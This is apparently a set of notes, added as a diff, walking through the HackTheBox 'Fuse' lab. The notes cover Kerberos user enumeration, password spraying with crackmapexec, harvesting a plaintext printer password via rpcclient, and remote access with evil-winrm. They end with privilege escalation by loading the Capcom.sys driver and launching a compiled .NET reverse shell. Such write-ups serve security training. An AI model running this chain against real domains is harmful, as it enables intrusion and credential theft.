@@ -1,0 +1,185 @@
+edited resolv.conf to include nameserver 10.10.10.193
+
+went to website hosted on 10.10.10.193 "http://fuse.fabricorp.local/papercut/logs/html/index.htm"
+Wre searchsplout for "papercut"
+
+Most of the links redirect to htm files, mostly static sites.
+	- No user inut to attack
+
+We find usernames and client within the link pages.
+	- We will grab all usernmaes and place them in text file
+		"users.txt"
+	- We will look if users are valid on the domain. Will use 
+	  a program called "kerbrute"
+
+We will now use kerbrute by specifying user list and domain name to use
+against.
+	- "./kerbrute userenum -d fabricorp.local users.txt"
+
+OUTPUT:
+	    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (1ad284a) - 11/09/20 - Ronnie Flathers @ropnop
+
+2020/11/09 03:27:08 >  Using KDC(s):
+2020/11/09 03:27:08 >   Fuse.fabricorp.local:88
+
+2020/11/09 03:27:08 >  [+] VALID USERNAME:       administrator@fabricorp.local                                                                    
+2020/11/09 03:27:08 >  [+] VALID USERNAME:       tlavel@fabricorp.local
+2020/11/09 03:27:08 >  [+] VALID USERNAME:       pmerton@fabricorp.local
+2020/11/09 03:27:08 >  [+] VALID USERNAME:       bhult@fabricorp.local
+2020/11/09 03:27:08 >  [+] VALID USERNAME:       sthompson@fabricorp.local                                                                        
+2020/11/09 03:27:08 >  Done! Tested 5 usernames (5 valid) in 0.312 seconds
+OUPUT OVER
+
+We now need to find a password for any of the users.
+The lame way is to use cewl to generate a password list to try on the users by scraping the website and see if any users are using keywords from 
+within it.
+
+	- "cewl -d 7 -m 8 -w cewl.out http://fuse.fabricorp.local/papercut/logs/html/index.htm"
+		- This will not actuall work we need allow cewl to grab
+		  numbers as well
+	- "cewl -d 7 -m 8 --with-numbers -w cewl.out http://fuse.fabricorp.local/papercut/logs/html/index.htm"
+		- This method will work
+We will now use crackmapexec to try and guess are way into a valid user.
+	- Install crackmapexec
+	- "cme smb 10.10.10.193 -u users.txt -p cewl.out"
+Using hashcat to generate a wordlist for bruteforcing
+	- "hashcat --force custom.txt -r /usr/share/hashcat/rules/best64.rule --stdout > hashcat_words"
+
+We also want crackmapexec to coninue on success so we will specify the
+flag for that as well
+	- "cme smb 10.10.10.193 -u users.txt -p cewl.out --continue-on-success"
+
+We can now try using rpcclient after we have found a username and password.
+	- "rpcclient -U tlavel 10.10.10.193"
+		- Look like that did not work, we can try and use a null\
+		  user.
+	- "rpcclient -U "" 10.10.10.193"
+		- That worked.
+		- However not much can be done within rpc, even if 
+		  we try changing a users password such as tlavel
+We instead can smbpasswd, to change the password of a user such as tlavel
+	- Password for tlavel: Fabricorp01
+	- smbpasswd -U tlavel -r 10.10.10.193
+
+We can now use crackmapexec to try and verify that we can log into an 
+account:
+	- "cme smb 10.10.10.193 -u tlavel -p "Ping12345"
+		- You have to do this fast otherwise it will revert back
+
+We can now attempt to get a shell with winrm, however that fails
+	- "cme winrm 10.10.10.193 -u tlavel -p "Ping12345"
+
+There is something on the machine that is reseting the password automatically. We have to change the password really quickly and attempt to get 
+in fast before the password is reset again.
+	 - smbpasswd -U tlavel -r 10.10.10.193
+	 - rpcclient -U tlavel  10.10.10.193 
+
+We can now enumerate from rpclient and get all usernames:
+	- enumdomusers
+
+We extract the usernames given by the rpcclient with the following:
+	- "cat rpc-users.txt | awk -F\[ '{print $2}' | awk -F\] '{print $1}'"
+
+We can now redirect this and append to users.txt file and keep bruteforcing. Rerunning crackmapexec:
+	- "cme smb 10.10.10.193 -u users.txt -p cewl.out --continue-on-success"
+
+Another thing to look for is the accounts and what they can poissibly do.
+One account to look at is the printer account "svc-print":
+	- "rpcclient $> queryuser 0x450"
+	- "enumprinters"
+
+There is apparently a password:
+	rpcclient $> enumprinters
+        	flags:[0x800000]
+        	name:[\\10.10.10.193\HP-MFT01]
+        	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+        	comment:[]
+
+	PASSWORD: $fab@s3Rv1ce$1)
+
+We will perform another crackmapexec and see if that password migh work:
+	- "cme smb 10.10.10.193 -u users.txt -p '$fab@s3Rv1ce$1' --continue-on-success"
+
+The svc-print can authenticate with that password. We will try winrm to
+see if we can remote in:
+	- "cme winrm 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'"
+
+We get a shell, we can now use evil-winrm to remote in:
+	- "evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'"
+
+And we get in.
+	- *Evil-WinRM* PS C:\Users> whoami /all
+
+Within the output we can load and unload device drivers:
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+ END OUTOUT
+
+We can essentially put something in the kernel:
+The account has this ability so it can load the printer driver but you can also load malicious drivers.
+
+Drivers to load capcom.sys driver; fighter video. We need a windows vm 
+with visual studios.
+
+We download a malicious driver by googling seloaddriverprivlege which 
+should take us to a web blog descriving how to absue this service we download a file within the post that contains the malcious driver for privesc
+https://github.com/TarlogicSecurity/EoPLoadDriver/
+
+We also need a utility that will allow us to use capcom.sys. We need to 
+download capcom.sys. Fuzzy security has it. 
+
+Compiling EOPLoadDriver from Tarlogic Security
+Steps
+=============
+create new folder for visual stuidos "fuse"
+1. Download capcom.sys from fuzzysecurity
+2. git clone https://github.com/TarlogicSecurity/EoPLoadDriver.git
+3. Google exploit capcom github
+
+No compile instructions, winging it.
+Use Visual studio 2019 to create a mew project and console app.
+Copy and paste EOPloader c++ code unto new project, LoadDriver
+	- change release to 64 bit
+
+Make sure to upload all of the following files to "C:\Windows\Temp":
+Capcom.sys  ExploitCapcom.exe  LoadDriver.exe  rev.cs
+
+The EOP loadriver is important as this will help load the malicious 
+driver as a service.
+	- ".\LoadDriver.exe System\CurrentControllerSet\PleaseSubscribe c:\windows\temp\Capcom.sys"
+
+Once that is created we will also compile the exploit capcom project
+and specify a specific file to execute.
+
+The specific file to execute can be a ".net" reverse shell which we can 
+find online.
+https://www.puckiestyle.nl/c-simple-reverse-shell/
+
+We will also modify the capcom exploit so that it directly calls upon the ".net" reverse shell. 
+
+This is done in visual studio 2019 and later transferred to the attacker machine.
+
+upload rev.cs 
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:exe /out:c:\windows\temp\rev.exe c:\test\rev.cs
+
+### Note that while "\windows\temp" is executable it is not readable (can't "dir")
+
+We then edit the exploitcapcom cpp file and add the correct executable to launch
+"c:\windows\temp\rev.exe" and traansfer to the attacking machine to upload.
+
+
+
+
+
